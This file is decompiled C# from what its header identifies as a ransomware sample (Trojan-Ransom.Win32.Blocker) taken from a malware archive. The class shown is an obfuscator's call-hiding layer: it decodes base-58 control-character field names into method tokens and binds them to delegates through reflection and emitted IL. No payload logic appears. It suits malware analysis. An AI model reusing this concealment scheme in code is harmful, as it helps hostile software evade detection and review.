// Decompiled with JetBrains decompiler
// Type: .
// Assembly: BOMBS, Version=0.0.0.0, Culture=neutral, PublicKeyToken=b01670ee6fa4859f
// MVID: D5D8F5B0-12EB-4325-8C3D-C60F341D062A
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.jjta-28a226e15e1e7b94528e46718041b3f49976b446eb3daccd652d0e5b43f948be.exe

using \u0001;
using System;
using System.Reflection;
using System.Reflection.Emit;
using System.Runtime.InteropServices;

namespace \u0003
{
  [\u0001.\u0001]
  [\u0002]
  internal static class \u0001
  {
    private static ModuleHandle \u0001;
    private static char[] \u0001;

    [\u0001.\u0001]
    [\u0002]
    public static void \u0001([In] int obj0)
    {
      Type type;
      int index1;
      FieldInfo fieldInfo;
      string name;
      bool flag;
      int num1;
      int index2;
      char ch;
      int index3;
      MethodInfo methodFromHandle;
      Delegate @delegate;
      ParameterInfo[] parameters;
      int length;
      Type[] parameterTypes;
      int index4;
      DynamicMethod dynamicMethod;
      ILGenerator ilGenerator;
      int num2;
      FieldInfo[] fields;
      try
      {
        try
        {
          Type typeFromHandle = Type.GetTypeFromHandle(\u0003.\u0001.\u0001.ResolveTypeHandle(33554433 + obj0));
          if (true)
            type = typeFromHandle;
        }
        catch
        {
          return;
        }
        fields = type.GetFields(BindingFlags.Static | BindingFlags.NonPublic | BindingFlags.GetField);
label_41:
        for (index1 = 0; index1 < fields.Length; ++index1)
        {
label_43:
          fieldInfo = fields[index1];
          name = fieldInfo.Name;
          flag = false;
          num1 = 0;
          index2 = name.Length - 1;
          while (true)
          {
            if (index2 >= 0)
            {
              ch = name[index2];
              if (ch == '~')
              {
                flag = true;
                goto label_14;
              }
              else
              {
                for (index3 = 0; index3 < 58; ++index3)
                {
                  if (true)
                  {
                    if ((int) \u0003.\u0001.\u0001[index3] == (int) ch)
                      goto label_9;
                  }
                  else
                    goto label_43;
                }
                goto label_12;
              }
            }
            else
              goto label_14;
label_9:
            num1 = num1 * 58 + index3;
label_12:
            --index2;
            continue;
label_14:
            try
            {
              methodFromHandle = (MethodInfo) MethodBase.GetMethodFromHandle(\u0003.\u0001.\u0001.ResolveMethodHandle(num1 + 167772161));
            }
            catch
            {
              goto label_41;
            }
            if (!methodFromHandle.IsStatic)
            {
              parameters = methodFromHandle.GetParameters();
              length = parameters.Length + 1;
              parameterTypes = new Type[length];
              parameterTypes[0] = typeof (object);
              int num3 = 1;
              if (num3 != 0)
              {
                for (index4 = num3; index4 < length; ++index4)
                  parameterTypes[index4] = parameters[index4 - 1].ParameterType;
                dynamicMethod = new DynamicMethod(string.Empty, methodFromHandle.ReturnType, parameterTypes, type, true);
                ilGenerator = dynamicMethod.GetILGenerator();
                ilGenerator.Emit(OpCodes.Ldarg_0);
                if (length > 1)
                  ilGenerator.Emit(OpCodes.Ldarg_1);
                if (length > 2)
                  ilGenerator.Emit(OpCodes.Ldarg_2);
                if (length > 3)
                  ilGenerator.Emit(OpCodes.Ldarg_3);
                if (length > 4)
                {
                  num2 = 4;
                  goto label_33;
                }
                else
                  goto label_34;
              }
label_32:
              num2 = num3 + 1;
label_33:
              if (num2 < length)
              {
                ilGenerator.Emit(OpCodes.Ldarg_S, num2);
                num3 = num2;
                goto label_32;
              }
label_34:
              if (false)
                goto label_9;
              else
                goto label_35;
            }
            else
              break;
          }
          try
          {
            @delegate = Delegate.CreateDelegate(fieldInfo.FieldType, methodFromHandle);
            goto label_38;
          }
          catch (Exception ex)
          {
            continue;
          }
label_35:
          ilGenerator.Emit(flag ? OpCodes.Callvirt : OpCodes.Call, methodFromHandle);
          ilGenerator.Emit(OpCodes.Ret);
          try
          {
            @delegate = dynamicMethod.CreateDelegate(type);
          }
          catch
          {
            continue;
          }
label_38:
          try
          {
            fieldInfo.SetValue((object) null, (object) @delegate);
          }
          catch
          {
          }
        }
      }
      catch (Exception ex)
      {
        object[] objArray = new object[20]
        {
          (object) type,
          (object) fieldInfo,
          (object) name,
          (object) flag,
          (object) num1,
          (object) index2,
          (object) ch,
          (object) index3,
          (object) methodFromHandle,
          (object) @delegate,
          (object) parameters,
          (object) length,
          (object) parameterTypes,
          (object) index4,
          (object) dynamicMethod,
          (object) ilGenerator,
          (object) num2,
          (object) fields,
          (object) index1,
          (object) obj0
        };
        \u0001.\u0003.\u0001(ex, objArray);
        throw;
      }
    }

    static \u0001()
    {
      Type type1;
      try
      {
        \u0003.\u0001.\u0001 = new char[58]
        {
          '\u0001',
          '\u0002',
          '\u0003',
          '\u0004',
          '\u0005',
          '\u0006',
          '\a',
          '\b',
          '\u000E',
          '\u000F',
          '\u0010',
          '\u0011',
          '\u0012',
          '\u0013',
          '\u0014',
          '\u0015',
          '\u0016',
          '\u0017',
          '\u0018',
          '\u0019',
          '\u001A',
          '\u001B',
          '\u001C',
          '\u001D',
          '\u001E',
          '\u001F',
          '\u007F',
          '\u0080',
          '\u0081',
          '\u0082',
          '\u0083',
          '\u0084',
          '\u0086',
          '\u0087',
          '\u0088',
          '\u0089',
          '\u008A',
          '\u008B',
          '\u008C',
          '\u008D',
          '\u008E',
          '\u008F',
          '\u0090',
          '\u0091',
          '\u0092',
          '\u0093',
          '\u0094',
          '\u0095',
          '\u0096',
          '\u0097',
          '\u0098',
          '\u0099',
          '\u009A',
          '\u009B',
          '\u009C',
          '\u009D',
          '\u009E',
          '\u009F'
        };
        type1 = typeof (MulticastDelegate);
        if ((object) type1 == null)
          return;
        \u0003.\u0001.\u0001 = Assembly.GetExecutingAssembly().GetModules()[0].ModuleHandle;
      }
      catch (Exception ex)
      {
        Type type2 = type1;
        \u0001.\u0003.\u0001(ex, (object) type2);
        throw;
      }
    }
  }
}
